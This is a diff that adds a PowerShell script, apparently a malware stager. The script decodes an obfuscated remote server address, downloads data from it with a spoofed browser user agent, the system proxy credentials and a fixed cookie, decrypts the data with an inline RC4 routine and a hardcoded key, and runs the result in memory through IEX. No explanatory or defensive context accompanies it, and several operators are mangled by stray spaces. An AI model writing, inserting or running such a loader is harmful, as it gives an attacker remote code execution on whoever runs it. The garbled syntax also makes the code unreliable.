@@ -1,0 +1,31 @@
+If ($PSVersionTable.PSVersion.Major  - ge 3)  {};
+[System.Net.ServicePointManager]::Expect100Continue = 0;
+$wc = New - Object System.Net.WebClient;
+$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAzAC4AMQA0ADAALgAzADMALgAxADIAMAA6ADkAMAAwADEA')));
+$t = '/login/process.php';
+$wc.Headers.Add('User-Agent', $u);
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+$Script:Proxy = $wc.Proxy;
+$K = [System.Text.Encoding]::ASCII.GetBytes('!hz%2x6mtC0AeYV,5Wju84/[snLaXH_D');
+$R = {
+    $D, $K = $Args;
+    $S = 0..255;
+    0..255|% {
+        $J = ($J + $S[$_] + $K[$_%$K.Count])%256;
+        $S[$_], $S[$J] = $S[$J], $S[$_]
+    };
+    $D|% {
+        $I = ($I + 1)%256;
+        $H = ($H + $S[$I])%256;
+        $S[$I], $S[$H] = $S[$H], $S[$I];
+        $_ - bxor$S[($S[$I] + $S[$H])%256]
+    }
+
+};
+$wc.Headers.Add("Cookie", "MbQrWboBJij=v2/3voIg4rUQ+JdKIqTSWsTshLk=");
+$data = $wc.DownloadData($ser + $t);
+$iv = $data[0..3];
+$data = $data[4..$data.length];
+ - join[Char[]](& $R $data ($IV + $K))|IEX
